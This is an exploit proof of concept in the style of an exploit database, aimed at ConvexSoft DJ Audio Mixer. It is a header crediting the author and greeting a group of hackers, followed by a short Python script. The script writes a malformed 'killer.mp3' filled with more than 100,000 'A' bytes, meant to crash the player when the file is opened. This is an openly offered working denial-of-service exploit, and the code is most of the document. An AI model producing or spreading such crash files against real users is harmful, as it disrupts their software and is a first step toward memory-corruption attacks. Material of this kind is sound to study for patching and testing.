#Exploit Title :ConvexSoft DJ Audio Mixer Denial of Service Vulnerability
#Software : ConvexSoft DJ Audio Mixer
#Software link : http://software-files-l.cnet.com/s/software/11/09/08/32/DJAudioSetup.exe?e=1287259187&h=dbc5a9e8f9e18318ea8bd54cf70dcfd7&lop=link&ptype=1901&ontid=18502&siteId=4&edId=3&spi=824ac8852d759d3ab5bd99d6b7dd702d&pid=11090832&psid=10788290&fileName=DJAudioSetup.exe
#Autor : ABDI MOHAMED
#Email : abdimohamed@hotmail.fr
#greetz: net_own3r , sadhacker , net-decrypt3r , xa7m3d , the commander , mr.fearfactor and all tunisian hackers
#Software version : n/a
#Tested on : Win7 Ultimate fr
#!/usr/bin/python
outfile="killer.mp3"
junk="\x41" * 105230
FILE=open(outfile, "w")
FILE.write(junk)
FILE.close()
print "[+] File created succesufully , [+]"